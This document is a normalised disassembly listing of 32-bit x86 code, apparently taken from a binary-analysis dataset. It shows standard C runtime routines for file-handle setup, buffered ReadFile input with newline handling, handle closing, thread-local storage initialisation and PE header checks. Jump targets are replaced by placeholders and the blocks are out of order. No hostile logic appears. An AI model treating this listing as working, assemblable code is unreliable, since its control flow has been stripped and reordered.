mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_45010c
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_45010c
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_444979
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_443b37
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_450f72
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_444560
pop ecx
push eax
call sub_445066
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_444560
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_444560
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_444560
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_444560
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_444aa4
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_443b4a
and [ eax ] 0x0
call sub_443b37
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_443b4a
mov [ eax ] ebx
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x9
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_443b4a
mov [ eax ] ebx
call sub_443b37
mov [ eax ] 0x9
jmp r-xdata
call sub_443b4a
mov [ eax ] ebx
call sub_443b37
mov [ eax ] 0x16
mov [ ebp - 0x10 ] ebx
cmp edx ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440791
add esp 0x14
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_445f36
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_450fbc
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
mov eax [ ebp - 0xc ]
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_443b37
mov [ eax ] 0xc
call sub_443b4a
mov [ eax ] 0x8
push ebx
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
jl r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_443b37
mov [ eax ] 0x9
call sub_443b4a
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
cmp [ ebp - 0x2 ] bl
je r-xdata
push eax
call sub_443b5d
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0x10 ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_44120e
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
inc ebx
inc ebx
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
inc ebx
inc ebx
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_443b37
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_450fbc
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_450fbc
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
inc ebx
inc ebx
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_450fbc
add esp 0x10
inc ebx
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_445066
push 0x10
push r--data
call sub_4433dc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor esi esi
cmp eax esi
jl r-xdata
call sub_443b4a
and [ eax ] 0x0
call sub_443b37
mov [ eax ] 0x9
call sub_443b4a
mov [ eax ] esi
call sub_443b37
mov [ eax ] 0x9
cmp eax [ rw-data ]
jb r-xdata
call sub_443421
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov edi eax
and edi 0x1f
shl edi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + edi + 0x4 ]
and ecx 0x1
je r-xdata
mov ecx 0x7fffffff
cmp ecx [ ebp + 0x10 ]
sbb ecx ecx
inc ecx
jne r-xdata
push eax
call sub_450421
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_443b4a
mov [ eax ] esi
call sub_443b37
mov [ eax ] 0x16
jmp r-xdata
call sub_443b37
mov [ eax ] 0x9
call sub_443b4a
mov [ eax ] esi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444aa4
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_440791
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_445159
mov eax [ ebp - 0x1c ]
sub_445163
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_4503aa
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_443b5d
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_4503aa
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_4503aa
push 0x1
mov edi eax
call sub_4503aa
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_450324
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_4451ff
push 0x10
push r--data
call sub_4433dc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_443b4a
and [ eax ] 0x0
call sub_443b37
mov [ eax ] 0x9
call sub_443b4a
mov [ eax ] edi
call sub_443b37
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_440791
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_443421
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_450421
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_443b37
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_445163
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4452c2
mov eax [ ebp - 0x1c ]
sub_4452cc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_44120e
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_4452fd
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_445a9d
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_445378
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_445a9d
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_445413
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_445378
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_445464
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_445378
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_4487b5
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_4454a1
push 0xc
push r--data
call sub_4433dc
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_445a9d
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_4488e6
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_445576
push 0xc
call sub_4488e6
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_449ec7
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_44557f
call sub_443421
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_445588
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_445413
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_445f7b
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_445378
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_44120e
pop ecx
xor esi esi
push 0x0
push esi
call sub_4454a1
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_44561b
push 0x8
push r--data
call sub_4433dc
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_443421
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_44120e
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_44120e
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_44120e
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_44120e
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_44120e
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_44120e
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_44120e
pop ecx
push 0xd
call sub_4488e6
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_44120e
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_445735
push 0xc
call sub_4488e6
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_445741
push esi
call sub_44120e
pop ecx
push edi
call sub_449f56
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_44120e
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_449d7e
pop ecx
sub_44574a
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call sub_445378
pop ecx
call eax
push [ ebp + 0x8 ]
call sub_44561b
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_4457b8
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_445a9d
pop ecx
call sub_445464
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_4453ea
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_445d87
push [ rw-data ]
call sub_4452fd
push [ rw-data ]
mov [ rw-data ] eax
call sub_4452fd
push [ rw-data ]
mov [ rw-data ] eax
call sub_4452fd
push [ rw-data ]
mov [ rw-data ] eax
call sub_4452fd
add esp 0x10
mov [ rw-data ] eax
call sub_44876a
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_44561b
push [ rw-data ]
call sub_445378
pop ecx
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_445f7b
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_445378
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_4454a1
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_445950
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_445990
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4459e0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_443440
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_445950
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_445990
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445a9d
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_445acd
mov edi edi
push ebp
mov ebp esp
call sub_44b0a5
push [ ebp + 0x8 ]
call sub_44aefa
push [ rw-data ]
call sub_445378
push 0xff
